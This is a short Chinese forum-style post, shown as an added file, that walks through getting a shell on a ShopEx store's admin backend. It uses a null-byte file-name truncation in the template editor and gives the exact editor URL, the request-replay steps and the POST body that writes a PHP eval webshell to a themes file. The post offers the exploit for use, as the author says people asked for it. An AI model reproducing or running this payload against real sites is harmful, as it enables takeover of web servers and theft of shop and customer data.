@@ -1,0 +1,31 @@
+Shopex 后台getshell
+好几个问我要。。既然如此 就发了吧。。
+
+应为SHOPEX把GPC转义回来了
+在模板编辑那里 可以直接截断文件名，
+代码就不贴了。利用方法
+
+打开
+
+./shopadmin/index.php#ctl=system/template&act=editor&p[0]=black&p[1]=index.html
+
+随便点一个编辑
+
+
+
+利用火狐插件
+
+LIVE HTTP HEADER 抓包
+
+下载(41.92 KB)
+3 天前 16:44
+点击replay
+
+将post的内容改为
+
+theme=purple&file=index(2).php%00.html&type=index(2)&file_name=&isbak=1&__=1&content=<?php eval($_POST[c])?>
+
+点击repaly提交
+
+然后./themes/purple/index(2).php 便是shell
+
